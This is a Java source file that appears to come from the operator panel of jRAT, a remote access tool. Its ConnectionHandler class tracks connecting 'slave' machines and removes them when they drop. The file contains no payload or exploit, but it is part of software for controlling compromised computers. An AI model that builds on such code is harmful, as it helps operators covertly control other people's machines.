package su.jrat.client.net;

import su.jrat.client.Main;
import su.jrat.client.SampleMode;
import su.jrat.client.Slave;
import su.jrat.client.Sound;
import su.jrat.client.exceptions.CloseException;
import su.jrat.client.packets.outgoing.Packet40Thumbnail;
import su.jrat.client.plugins.PluginEventHandler;
import su.jrat.client.ui.frames.Frame;
import su.jrat.client.utils.TrayIconUtils;
import su.jrat.client.utils.Utils;

public class ConnectionHandler {

	public synchronized static void addSlave(Slave slave) {
		Main.connections.add(slave);

		Object icon = null;

		if (Frame.thumbnails) {
			icon = "...";
			slave.addToSendQueue(new Packet40Thumbnail());
		} else {
			icon = slave.getCountry();
		}

		Frame.mainModel.addRow(new Object[] { icon, "Unknown", "Loading...", slave.getIP(), "?", "Unknown", "Unknown", "0 mb" });

		String title = Main.formatTitle();
		Main.instance.setTitle(title);

		TrayIconUtils.setTitle(title);
		TrayIconUtils.showMessage(title, slave.getIP() + " connected");

		Sound.playAdd();
		PluginEventHandler.onConnect(slave);
	}

	public synchronized static void removeSlave(Slave client, Exception e) {
		if (SampleMode.isInSampleMode()) {
			return;
		}

		Main.connections.remove(client);
		try {
			Frame.mainModel.removeRow(Utils.getRow(3, client.getIP()));
		} catch (Exception ex) {
		}
		String title = Main.formatTitle();
		Main.instance.setTitle(title);
		TrayIconUtils.setTitle(title);
		client.closeSocket(new CloseException("Removing connection..."));
		Sound.playRemove();
	}

}
